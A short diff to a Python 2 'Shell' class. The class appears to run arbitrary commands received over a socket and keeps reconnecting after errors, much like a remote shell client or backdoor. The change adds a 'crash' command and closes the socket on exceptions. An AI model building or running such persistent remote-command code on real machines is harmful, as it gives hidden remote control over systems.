@@ -144,6 +144,8 @@ class Shell:
 		elif command == "LIST_FILES":
 			if not arguments: arguments = ""
 			output = self.tab_complete(arguments)
+		elif command == "crash":
+			raise Exception("As you wish")
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
@@ -164,5 +166,6 @@ while True:
 		shell.run()
 	except Exception as e:
 		print e
+		shell.comm_socket.close()
 		time.sleep(10)
 		continue
